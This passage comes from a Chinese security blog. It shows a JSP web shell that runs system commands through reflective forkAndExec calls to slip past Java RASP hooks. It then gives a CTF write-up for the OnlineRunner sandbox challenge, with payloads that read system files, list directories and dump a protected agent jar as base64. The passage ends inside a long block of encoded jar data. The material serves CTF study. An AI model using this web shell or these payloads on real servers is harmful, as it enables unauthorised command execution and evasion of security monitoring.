&#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            processClass = Class.forName(<span class="hljs-string">&quot;java.lang.ProcessImpl&quot;</span>);<br>        &#125;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">processObject</span> <span class="hljs-operator">=</span> unsafe.allocateInstance(processClass);<span class="hljs-comment">//创建UNIXProcess对象</span><br>        <span class="hljs-comment">//原代码</span><br>        <span class="hljs-type">byte</span>[][] args = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[strs.length - <span class="hljs-number">1</span>][];<br>        <span class="hljs-type">int</span>      <span class="hljs-variable">size</span> <span class="hljs-operator">=</span> args.length; <br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; args.length; i++) &#123;<br>            args[i] = strs[i + <span class="hljs-number">1</span>].getBytes();<br>            size += args[i].length;<br>        &#125;<br>        <span class="hljs-type">byte</span>[] argBlock = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[size];<br>        <span class="hljs-type">int</span>    <span class="hljs-variable">i</span>        <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">byte</span>[] arg : args) &#123;<br>            System.arraycopy(arg, <span class="hljs-number">0</span>, argBlock, i, arg.length);<br>            i += arg.length + <span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-type">int</span>[] envc                 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">1</span>];<br>        <span class="hljs-type">int</span>[] std_fds              = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>&#125;;<br>        <span class="hljs-comment">//构造forkAndExec需要的参数</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">launchMechanismField</span> <span class="hljs-operator">=</span> processClass.getDeclaredField(<span class="hljs-string">&quot;launchMechanism&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">helperpathField</span>      <span class="hljs-operator">=</span> processClass.getDeclaredField(<span class="hljs-string">&quot;helperpath&quot;</span>);<br>        launchMechanismField.setAccessible(<span class="hljs-literal">true</span>);<br>        helperpathField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//从UNIXProcess中得到launchMechanism和Helperpath</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">launchMechanismObject</span> <span class="hljs-operator">=</span> launchMechanismField.get(processObject);<br>        <span class="hljs-type">byte</span>[] helperpathObject      = (<span class="hljs-type">byte</span>[]) helperpathField.get(processObject);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">ordinal</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>) launchMechanismObject.getClass().getMethod(<span class="hljs-string">&quot;ordinal&quot;</span>).invoke(launchMechanismObject);<br>       <span class="hljs-comment">//反射forkAndExec方法</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">forkMethod</span> <span class="hljs-operator">=</span> processClass.getDeclaredMethod(<span class="hljs-string">&quot;forkAndExec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;<br>                <span class="hljs-type">int</span>.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class,<br>                <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>[].class, <span class="hljs-type">boolean</span>.class<br>        &#125;);<br>        forkMethod.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">pid</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>) forkMethod.invoke(processObject, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<br>                ordinal + <span class="hljs-number">1</span>, helperpathObject, toCString(strs[<span class="hljs-number">0</span>]), argBlock, args.length,<br>                <span class="hljs-literal">null</span>, envc[<span class="hljs-number">0</span>], <span class="hljs-literal">null</span>, std_fds, <span class="hljs-literal">false</span><br>        &#125;);<br>        <span class="hljs-comment">// 初始化命令执行结果，将本地命令执行的输出流转换为程序执行结果的输出流</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">initStreamsMethod</span> <span class="hljs-operator">=</span> processClass.getDeclaredMethod(<span class="hljs-string">&quot;initStreams&quot;</span>, <span class="hljs-type">int</span>[].class);<br>        initStreamsMethod.setAccessible(<span class="hljs-literal">true</span>);<br>        initStreamsMethod.invoke(processObject, std_fds);<br>        <span class="hljs-comment">//获取输出内容</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">getInputStreamMethod</span> <span class="hljs-operator">=</span> processClass.getMethod(<span class="hljs-string">&quot;getInputStream&quot;</span>);<br>        getInputStreamMethod.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> (InputStream) getInputStreamMethod.invoke(processObject);<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">int</span>                   <span class="hljs-variable">a</span>    <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-type">byte</span>[]                b    = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>        <span class="hljs-keyword">while</span> ((a = in.read(b)) != -<span class="hljs-number">1</span>) &#123;<br>            baos.write(b, <span class="hljs-number">0</span>, a);<br>        &#125;<br>        out.println(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>);<br>        out.println(baos.toString());<br>        out.println(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);<br>        out.flush();<br>        out.close();<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure><h1 id="例题分析"><a href="#例题分析" class="headerlink" title="例题分析"></a>例题分析</h1><h2 id="mrctf-2022-springcoffee"><a href="#MRCTF-2022-springcoffee" class="headerlink" title="[MRCTF 2022] springcoffee"></a>[MRCTF 2022] springcoffee</h2><h2 id="强网拟态2024-onlinerunner"><a href="#强网拟态2024-OnlineRunner" class="headerlink" title="强网拟态2024 OnlineRunner"></a>强网拟态2024 OnlineRunner</h2><p>记得当时题目是一个在线的java在线命令执行环境，直接让你写Main函数的部分，所以也没办法import类，只能直接写全类名</p><p>当时就是尝试了一下正常命令执行payload发现不太行，java沙箱也不太会绕不过去，遂摆🫡</p><p>这题没有附件，当时也没怎么看，现在只能看wp学习一下</p><p>先是用下面的payload任意文件读</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span> &#123;<br>            java.io.<span class="hljs-type">FileReader</span> <span class="hljs-variable">fr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.FileReader(<span class="hljs-string">&quot;/proc/1/cmdline&quot;</span>);<br>            java.io.<span class="hljs-type">BufferedReader</span> <span class="hljs-variable">br</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.BufferedReader(fr);<br>            String line;<br>            <span class="hljs-keyword">while</span> ((line = br.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>                System.out.println(line);<br>            &#125;<br>            br.close();<br>        &#125; <span class="hljs-keyword">catch</span> (java.io.IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br></code></pre></td></tr></table></figure><p>然后得到启动服务的参数</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">java--add-opens=java.base/java.lang=ALL-UNNAMED-javaagent:/home/ctf/sandbox/lib/sandbox-agent.jar-jar/app/app.jar--server.port=80<br></code></pre></td></tr></table></figure><p>这里可以看到是给沙箱上了一个agent来检测程序，也就是RASP了</p><p>然后用下面的payload来列目录</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">java.io.<span class="hljs-type">File</span> <span class="hljs-variable">folder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.File(<span class="hljs-string">&quot;/&quot;</span>);<br>        java.io.File[] listOfFiles = folder.listFiles();<br><br>        <span class="hljs-keyword">if</span> (listOfFiles != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">for</span> (java.io.File file : listOfFiles) &#123;<br>                <span class="hljs-keyword">if</span> (file.isFile()) &#123;<br>                    System.out.println(<span class="hljs-string">&quot;File: &quot;</span> + file.getName());<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (file.isDirectory()) &#123;<br>                    System.out.println(<span class="hljs-string">&quot;Directory: &quot;</span> + file.getName());<br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;The directory does not exist or is not a directory.&quot;</span>);<br>        &#125;<br></code></pre></td></tr></table></figure><p>下面的payload看jar包的条目信息，也就是一些包含的文件和目录信息</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span> &#123;<br>    java.util.zip.<span class="hljs-type">ZipInputStream</span> <span class="hljs-variable">zis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.util.zip.ZipInputStream(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.FileInputStream(<span class="hljs-string">&quot;/app/app.jar&quot;</span>));<br>    java.util.zip.ZipEntry entry;<br>    <span class="hljs-keyword">while</span> ((entry = zis.getNextEntry()) != <span class="hljs-literal">null</span>) &#123;<br>        System.out.println(entry.getName());<br>        zis.closeEntry();<br>    &#125;<br>    zis.close();<br>&#125; <span class="hljs-keyword">catch</span> (java.io.IOException e) &#123;<br>    e.printStackTrace();<br>&#125;<br></code></pre></td></tr></table></figure><p>用下面的payload下载agent.jar然后反编译查看源码</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span> &#123;<br>    java.io.<span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.File(<span class="hljs-string">&quot;/home/ctf/sandbox/lib/sandbox-agent.jar&quot;</span>); <span class="hljs-comment">// 需要读取的二进制文件</span><br><br>    java.io.<span class="hljs-type">BufferedInputStream</span> <span class="hljs-variable">bis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.BufferedInputStream(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.FileInputStream(file));<br>            <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>]; <span class="hljs-comment">// 创建一个字节数组作为缓冲区</span><br>            <span class="hljs-type">int</span> bytesRead;<br><br>            <span class="hljs-keyword">while</span> ((bytesRead = bis.read(buffer)) != -<span class="hljs-number">1</span>) &#123; <span class="hljs-comment">// 循环读取</span><br>                <span class="hljs-comment">// 处理读取的数据（这里可以进行打印、处理等）</span><br>                <span class="hljs-comment">//System.out.write(buffer, 0, bytesRead);</span><br>System.out.print(<span class="hljs-string">&#x27;&quot;&#x27;</span>);<br>                System.out.print(java.util.Base64.getEncoder().encodeToString(buffer));<br>System.out.println(<span class="hljs-string">&quot;\&quot;,&quot;</span>);<br><br>            &#125;<br><br><br>        &#125; <span class="hljs-keyword">catch</span> (<br>java.io.IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br></code></pre></td></tr></table></figure><p>然后python脚本写入jar包</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br>data = [<span class="hljs-string">&quot;UEsDBAoAAAAAAAsdRlkAAAAAAAAAAAAAAAAJAAAATUVUQS1JTkYvUEsDBAoAAAAIAAodRllB90L8xgAAAFMBAAAUAAAATUVUQS1JTkYvTUFOSUZFU1QuTUadj8FOwzAQRO+R8g/+gbVacUDKre0NEVSBxH0TT4ghXiN7E6V/j9sq4sKJ486M3uy0LH5AVnpHyj5KY/Z2V1eH1I9+QfqVzxPWOZvNqKtTAiscHS+NOXxzP8K0vEDq6jj7SW96uGTv7oKjJ/dV6I92Z/cPBC4lHxCl08Q5N6aPwfLkO+7Yfi7BZhbXxdXyNWRv0WeepdRcu1noFQ6DF9wBKAhNMzZPE0seYgp/2W9QemEtO6iFjtHRORXWumXKFdjLv16rqx9QSwMECgAAAAAACh1GWQAAAAAAAAAAAAAAAAQAAABjb20vUEsDBAoAAAAAAAodRlkAAAAAAAAAAAAAAAAMAAAAY29tL2FsaWJhYmEvUEsDBAoAAAAAAAodRlkAAAAAAAAAAAAAAAAQAAAAY29tL2FsaWJhYmEvanZtL1BLAwQKAAAAAAAKHUZZAAAAAAAAAAAAAAAAGAAAAGNvbS9hbGliYWJhL2p2bS9zYW5kYm94L1BLAwQKAAAAAAAKHUZZAAAAAAAAAAAAAAAAHgAAAGNvbS9hbGliYWJhL2p2bS9zYW5kYm94L2FnZW50L1BLAwQKAAAACAAKHUZZjfQUsW8FAADNCwAANgAAAGNvbS9hbGliYWJhL2p2bS9zYW5kYm94L2FnZW50L1NhbmRib3hDbGFzc0xvYWRlci5jbGFzc5VWXVcTVxTdF0IGwigaCBRBSykgCWisrVYBrRWhYgNaoliktr0kAwxMZtKZCWq/1+qfaH9AV19xrVZau+xjH/pv+u5qu+9kEgKEpX3IzM255+x9Pu+dv/55+geAS/hWQ4OAvi43Zdo2/PSd+UycGxEdTYgKdBXkhjHp2Dnp3zX9Na48X9q+JzA0nAmMLGmvprO+a9qr48n9ohgEmnW0ICYQnTBt078skKhnuxCDjkMaDivtNlLX+jRpSc/LODJvuALx4aVM7SZtm3FUIJmVdn7ZeVijvGTLguEVZc64NOiNF6W/pt73NbQLHNnx4ebyupHzY0igU0OXjlfQvWu/7CMjWHHcgvQFLtaJYCmzF7BeQlrQg14Nx3WcwKsCZ3JOIS0tc1kuy/T6ZiHtlWNIy1XD9tP7I2I6fafiT7xewnvwmo5+vM6yrph2ft7wnJKbMwT6Dy5ZJZOqBoM6hpR166rhV4wV6rCOJFICh2pR2QkjB8OWfNNKT9mlguFK33TsAH9UxymFo9fge4ogreMM3hBoUwRBtPkgcIHBFzRboBaE/g==&quot;</span>,<br><span class="hljs-string">&quot;po63FEaLwgjESnpex9u4QEqXfNamEcJ2DO/DSC5oGBNo35FPPcwZReW88n1C58ywg1ssuhei1JuEe/u9a8UVvKvhqo5JXBM4GuybDncdz5DLFgvUlFNrgcZh5cb0Ljdur7nOg7LayTqE9QZKIDLp5GnQljFtY65UWDbc22WIeMbJSWtBuqb6Hwoj/prJeM5m/m9PjjMh1UET6Az1Jx3XuCHdadMybnHyBGLVXHoaPhA4Ue29WWmp0TLybMKqEj1SqMxHybUEDu9uVTZi1pe5jVlZrPhPNfrfdUDv0bHdUT8qViI/Wd9kYjfj5XENSzy96upquF+pF4s6c7MmipasuWpLv+SSafzlh2UfO88fGfbc0X3tJSAIn8jUaVzuaWHjU+seJ9uqHa6OvVgTKRWpyb7Zs6FhQ6Bvj3DO8aedkp2vCTj5UhOhaNQM1jkkSR2MwszKLcfzzKBGsWxwUqhuYo33N+FphcJT+6rj+J7vyuKs4a85ea8tCp4BPkoaNtWt9kBgYIfQtDedDSPkLV900zLnO+4jge9rwwgVy6DXyW4Z3kDGcTZKxTrDd5Ch6rk66i+4OkKISWlZWdM3xpvxSN1FzMSY4KE2Y9uGG2TCYIm+5HH5Um5r+LoyggeqkqasjD4eozq/DHh2qJuLqyh/LXgPDbjOlQ8NjXyfTkWeQSw2/s7H6FMl2oaW3UZrKn6k6Rnii40j2cXIaPZXdPyCY49p0YAZPg8H1h28ehO8Hjpxg//6yoh4HxkgWM2SWQSrOa4acFN9q1Byiz9eWnwqXz7jjrJMpEaeoG9WjP6IptGt1Mg2BmZHt7jRGFB2shuAYwykB63oxSEG1k7YHepElTqB+YA6ijZkcZsEdyhthniuvlk4VupOo42i/66W/mQt/UiZPlJDP0DIQdIPkX6Y9MkX0i/gLgk+pFSvShb3OHSvmpmP8HGQ40/IxKsrdPFvvhV7Url4eu7Un2g6taXWZ8civT+gJdUdeYJz3ZGtsUhqpHcb41uE0ulCHy6G7g+x+KoQUaQR48WtLt52nEMXzuM4LgSa/RgLwrlMrXYG+CkkrfvZKsvIcUUHqiEmwxDVKg+DLkdZ0BVaNAbBdlJSxlilZXlvlXsq7H40PoeuYe05jvD5L1UjGno0JAT/go+L1YSshwmxuD6BQtgy6aCGQFPqZxzbqnZlNBBeCYLQywqhwwI2roXGC3w38N2a+g3vCPyESOZxoBxljqbCbosH8c5TdofSLHO2UAPbGsKqaPhJPqPRjoZO4EmRHR3UFi5/D/E5/6kP6y/wFb5B939QSwMECgAAAAgACh1GWZNuBnUfFgAAyS8AADEAAABjb20vYWxpYmFiYS9qdm0vc2FuZA==&quot;</span>,<br><span class="hljs-string">&quot;Ym94L2FnZW50L0FnZW50TGF1bmNoZXIuY2xhc3OtWgl8VNXVP2cykzeZvJAwASQgEpA1q4KghEWSkJBANjMBDKDxkbwkA5OZdGYCpLZudana2iq2Fdxaa0sX2yK0Q4AK2r22drG2dret3fddbal8/3Pfm5mXZNj69Se+9+69557tnvVOnn396HEiWumaoJGLqbQ7MlBphILbjG1G5fadA5UxI9yzLbK70ugzw/HKank2GUPh7n4z6iM3eTTK1kkjL1PBdmOnURkywn2Vrdu2m91xpuwVwXAwvoopa8HCjTnko1yNdJ3yaAKTrsCDkcr6YMhkyouZg0bUiEeitf1GlIlr/WCrQKeJ5Ge6YMDYYdZGwt1GfFMw3o+vWNwIx2NM8xc0pekG4tFguG957cLxc34Ch8LCZJ2m0AVMOSmCTP5M8C4qEurTmJZlojF+KiPVLCrygfQMnS6imUwT+8x4wFJpbW9fmxHvZ5qXAX1GXG6aJRzNZroiw5ZzROKhAi/NZfKoE80Bb/N1WiAayW2q3tBS29DV3LqmTngu0amUynBS8Ui9acSHomazMch08enZHYoHQ5UAWi7bK3SqpEuYtKAcVijEFFgwBsyBSICiQwNiZI2pTyMejISTyMOmLEF9ke4dZry6pydqxmLLvbQIdmbE40Z3v1C9TKcltBRMQ9EtxoAZGzS6zTTTKdIZdCPbr9BpmWz3YntHZIcZlsnlOq2glTi8XdFg3KxWtNrN2FAIJl57TidxJgnEM5iu1Gm1HEJBe11gQ1NHV31jU11XW3VHgw82WyMuVss0OZPqNwpEnU71tBaaMHcHY+IX8LjNstCo0zq1EIyJo8lUk07NMuXtNsKbRCKNWpmmpTG3D4XjwQGzbne3OSgn4Kdsukosr51pts2C7biZ9dhCNRptgF85QRUpBI0O2iTiXI3lMbg2L9zopc04u7mx5cl/Ph9tpWs0ulanLrouyWZGTcKCcWoNkZg6eKZJCzIyt5W26dRNPbBMgLdFonGlrUYf9VKfRv06BWk7Dju9tTEcN/tMxAltpxEaMlt7maYsaHQityGAPUQDGoV1itDgqJBokcc59EaiA0Y8c1DZ4piyYmhm/XZQVKcYSYQ1BgfNMGQpcaKTEBow3zBkhrtTJwQlWyeg9u/UaZcEbU9vaCjWLzPDOr1RzXSHIjGYxJuYCtMYO/qjkV3GNjGg6+kGnW6kmxCzjZ6ewNDgoCjfBA9TnTykdsBCNboliQ1sNLamLEtM5VaxhpvEB27X6Q56K8zcTjq1ISMWa4oYPWZURZ78MT6cS3fR3Rq9Tae30z1gZ9QqrKE7ghCCwLLeHB7jO0nlbhYU79TpXroPRgBzGBONMxyCPQ==&quot;</span>,<br><span class="hljs-string">&quot;pdH9TJecOVsGxonhoz30bpH3PZkzVyb3Fhb36rSPHgSLg0PxMdHf5uecmPbSw0yLwXSFzXQFmK6wma7ojkTNipgZ3WlGK9qikd3DtZgIqLHw/ahO76X3IXGGIIqSiWnuWVKXAgPZ98N3ekyE9ciwRh/ASY4B8dHjtF+nD9GHgR/H0GzG+yOwqNVncRILv5Ni1OwNQdRKCwNIf9QKC42qYuiG/X6MPq7RJ3Q6QE/CZE+3UyJmeCcywBhPtTV5Fk+1p0Rth3T6pPhVvvKrxt62SCwWhFvIsSZ0OiyWlx01ByI7Tck1R3Q6KglossSmaGTQjMaDpgrdUiwIxKd1ekog8lNp2VKMrJ3Q6WlZm5AuMxoiA/DmzwBj2j22G9HKdUbUSghMn9Pp81KcTErvCgwOA8Ai+Qx9UUz2S4iJY4M/jPNZ+opGX9XpOfoa05xzSehIIlbU6ojURCJxrBmDDh8JmEa0G2XRNGfKdnCsMh7TN3T6pjA92VFRwV5TXDN9S6cX6NsoHsVgW6NrzN5g2HQQYlp53mWUYzts60XE3TN6k3CEYrU32Idj8tH36FGNvp88irEIvfRD2Go8ktrgpR+rxF0TDPdo9JNROQmaC5kGAuhL9DOdXpZ8rm+z5jZKkvLSL5jc27DTS7+y6pmmSLcR8tJvkL1sJoutuqm414BeeyokGv9Ojvr3Y/LJeNU4o7skvT/q9CdJqdkhM9wX7/fSX5BJrt0aK5kjq3/T6e/0D8QAZD50DrHTVDKb5dRe0elVgS0Ixloi8RoA7LDWNfoXzjJtEk3B8A6zp8GI9SPa++g18sj2/+j0umzPg9rSe+F/+E/SM7t0zmI3uIsNhoLxzGF44Zbxc17OBoqVcFv26pwjCteCsbqBwfgw6HKuzrpU5gVQNCzNQHFobURi4wk650tx52oNeHkiwviuYFh4KdR5Ek+WSszOVEzTT5/HN3sZONz9cGhBWqTzNEE6aU1dfbWUjIHqljU1rVd3NbQ2S/3OF+o8gy9i8qVZYlp7hhr8fBoJIVCs8yzRQ04wtgmGFtkV8/LFUhtdGVx47ZbKrVuvWbDFKH/jNQvVt4/n8jyN5+u8gBeOOskoaqfdlXBbVCeIDhpcalA1heVnaTVGbVwuBEp1LuPylKXBxxefrTByYGq2NgFTJV+i8aU6LxL5xrHanETu7hUH48vwNefSqkrZt1TnyyUu6VFzMITeoz4YjcW9vAxqCif7ES8vVwlRnYmX0Vp44tJsePlKJiSLauAbRPAXJdfqvEbwTU3HuXRekFDn5Xr43dzYStTLPm7gRo3XoTrk9UnGHdqrGQqGVOQ7g2bHg8P2m5k6l3f39gmR2HAsbg50DUR6hkKmTOBLvQ==&quot;</span>,<br><span class="hljs-string">&quot;7ajSJRYq4yEUEw4wSLQzCHTynVKF4hpiturcNiYHNaudIqKYe7vOATH3qUkz3xCoa5dedUOqUWLeoPNGwTJllLIUVZUVuIFqvNypun9V5wQHvbwFZ3FJhfpPcFyj87XcBU6sJFUfjQw429/W8ZpLqum/8ayNXjYQ9W12BtGNeLkbgeYSOUpT515perzxSDLHP879OgcZDUqhVSHEUWggqa6JDCCASH9mH2PM7B5CvT9cORYGRhLiAY3DOkcYAl10ZnCEUhCqxREHIkNR6aUvHEcivQrkUY5pHNd5iHcm66sMgFZVJinJKgkKFjja/A3tTUC0m4c1fqPO14sKdOei1brZ/Sy/Wecb+EaLzzYjijLDulJKoUyWKwJ8s863CL6cFLAfCW+Wj2/j2zW+Q+e38p2jGzdl7Tb2lONJs+OMH+kVOMvdQC+2XyGO4OO38z0av0Pndyr7zrTHUoY9HvaTl2ZpvAe9SBoYGQI6FH4ra1OfyeTH95HHy++GWiKxCnEtEeceyTB7dd4n4qKsaIrsMqO1Rgyamei46emqXlvX0gH5kpdqqnyQOzEnTEdHdW0DxAoE+8LKF5g2jDb3FRnM/Xzbo+WrEBcvqG2qDgS6Wuu7alvb6/BoqW9cu6G9DhVhaqWtvfXqTmsdUWBjXTsMpK65raOzK9DR3tiCmF2wvq5zVEaEhDLVUt1cF2irrsV4YjJxOuYUjIWyq7ENuTMJI4N8x2JbazuUpieXrWGOAHS0rq9rAabkkj2eKmvgu62uvaOxLpC+4EGsF7eQ9hb1acvQwDYz2iGllZyBlGwbjWhQxvakO94fhMWUn0W7o65ql0uISfcDMBQ07ZZ3Lz9zoXeme7mNkLLX2YKAOYGH4Z4bBmhMMWtx4ut1hNkpo0UfHkyKv+TsZjduRszK1bsL3jcqINj3IYi2wDs5teS4n8CaJySMIOqd6Q5PVQLC3YTREQcKCqDC3gFGbfZzu50NyKLzdxFVH6k+BxpLMRqTkBNO3bT6x9+gYFKRbu1Vvb3V10soGNtNp7SUnltRIhrkeEpLY3oAOO1peiQ4ok011dUASUS1xzLnaI9GX8PbHTTSXBJ4FNu8WW6qjCGJZv7BcX0y5BIl1Y82zuEF/5Xt/A9uqVGgxWwm8nqc3QEsZsfOgNkneKqjUWMYAmdoPjC7Y2ebEYzaoMnN/lGzCoHGP2JqPPsd/Tk7TtaA+GPWDrlE023m7Rwx8P9W6Pm0HDh15OGi01btabHPk5+MtHKSka0mRTNDycc0dK714P9SOYi83hXdIfvXNZ9VUllVj39U4K+QvXDC1EWLdbsVy8/mv/j4r/w3jf+u00T+x5i7G7n5sqlZP7vVG93xSBQm8MCCpg==&quot;</span>,<br><span class="hljs-string">&quot;cYAW0gbEnJAZm9MUiewYOkv5O2qjRPcM4Ge5Y7NR1CLgBRDHUXe9gpjAjC7Fy69BQcxW7+HlfyOfMCPKsh0Xy9XtzHYj6uX/IB6NXosNDltLpxAKOTldkY4yXhdD6czJhsbrymIqVj8OFccjxVH101CxJITiqmJO3q54XR4cRApfuc2cS1OzqXsj1QjC0xrDYZRrEjvNmObyMc09J7VrLj1Z0p8WFNHIAqZZhMxFRJNpmlwm4GuadFnq/SDezA/h20VzMH7YMb6UfPKbocDJz1bqfQe9FeuPyDo/Cvj3OuC/g/H7HOOHMH4sPeZVGL/fMZ6C8eOO8RUYf8AxrsL4g47x1Rjvd4w3Y/whx/g6jD/sGG/D+COO8QqMPzqGnycc49UY59tysvzcjZWPYVQp10p4e0oOU9aTCvTjeGaryWn8CTx1C4APsKz75Gdge/NlUISs+UoOUs5Ryic6MAbDDAcGHx9UDPikT86MoXA8hlmZMMjFqY3hcspSa3mC4SBNOkpTxyOZ60CSl0Ly+TMgmT4eycJMSORqI4XEZSMZoQsVkuLxSMozItl4OoVcPB7DpRkUksOH+JM2hvXA4MI73z/nEM0DLwtLR6h8U/psJ0BYoq3koWvwfa1CN8Xawp9S6OQrwYdBIodHUojvgKPJzun+S23EzWUjtBj/X14mJEaoSohkKSKzYWFE/SAShKa3Uy7tgH2EaBINgMR2WGFEES62UKYIT7cJ+xDSj8AfXXzUllbN8DEwWiI/ZltM8V5oRQPE/cfI13mQVh2m6pbyBK3ZSzPxathLPrzW76OJx6ils/wotREdpsCJY9TRWe4+TBur3EVuf6f2FLk7s0oCne7SQKenLEFbAp3ZeBkjZAZGaEeC3rCpyJ2gIXns3k9FVR77S6/KLvIUZSfozUWeE/spv8othIqA+i0nnoRsy6iXwnQ9DdIQ7ca7gm6FIm+2tbSO5G9EboB2boTt3wSt3AyN3KKgltFt1ER3UoDuos10Ow7rNjLo7cB3DzDeiv/eCUz3AOIdtIf2KG2ugjaW0Xr+NEMgrPj4OJ9Q8fF+XmZr+H5eKXFBfT3Nz0CfuXQnf4Y/C54+h9m15D1JxRr58k7RlfLnMSH1bytmNOog1uj6U5RD2WMWMK3WvK+Rq0ajm3NxTC/Qt3GAYjsftW1n9UG6reQI3emivVTM1uAdLvoAFaa+n6Y9zftp6jHa01lSepje1SwrZUfogSzaVHYgZWDTICohDE+kh6mIHqGF9H5aTI9DBfuVKkpAcR5gP89fULa9OqWA1fxFpYDFcEC1qsTOIdfCkzRJgya/hKEbANfD5b9MtbYIX7FFaHZy2sSlHyT3k6X+hxL0SHOZ/7Gspw==&quot;</span>,<br><span class="hljs-string">&quot;6PEEfbDM/xH7i/GGqTxhvzaVJuigheFTLlJe6VbyzAMHRAcpjw7BKD4JcxiBjEeolI5Cpqeoho7DHE44nKbZligPEj0LORjwi/kr/FWH01gzz9kyIuifpMLRIpbI37hYIrqegU7z4FST4dyLm/EYacHjWJUbz+NVntJj9Eyn+FmRZ4Q+C087TF84Ql92UZlMfH2EnoczZPu/k6DvVmlFmv8HHqigM8sfgl/hIcrwKEcrcmOmHBNPVHmx4SHZkFOUM05nVT5M/sieLPLZs0/TSwn66dLcybn7qAEAP7fIFGlC5tmAArXpeJVHi9r304wqHcCPjcW2qUg/gflfjqey9UCVR5zZ/+siz2H67QmY0UfoeZj09Sh3ssXW7aO7RQI97MNDX0WUeo4K6BsIqM+jNvkW1Ps8FPxdWkTfpyV4V9FLsKifwYtfRkT8JcXpN/Qm+i28+Xfw1z/CE/4KKn+nT9M/6Gv0T+z+Fyi+Qi/Sq/R7eo3+RKfoFfVbEHM2nWKN3ZzDHmUW9yCcv0hT+Wv8dZK/EfsLXwAD8YDmczCQb+Bwa+lz/E0YiAbaD/Hz/C2YRBzmIEaTA/o38AuY84GLbfRj/jblcg7p/B3g84hZqIhM6suK0h4uUEboQqTJ5RfxlQXdePi7+HIrIxRTtag+B6oWrefE1AUbojkpw2ygrFMQU9foLo2eTUYW69/3NHpcI7f1ZBVjik6JXGOA1YpdvX0PMrwKDVqJa6udU6dzCUqwkgT94REqKPH/OUF/3Ueaez+5s55IxRX5IzXiYsrmWciCs1EDFTsS7nT+vvicYtpDrqLVkpdeT1GqsaspKQH+OR63SuA8b1QJMApfruCTn+FsfJsB5Eri20taCfCVHhjDawlpXIqjKsNRlTiyuY1bff1AlYJCRRMqoi6f/G2c5fh8FRBJvr7xGL3WeZj+3QR6J/eSp/RAif9Ugrm57Pg+GZW1lB9f6s5a6pnsmex+jK4qn+xZJD6voLP3U1VRdiF7sEH8/7jnvbSwSMtah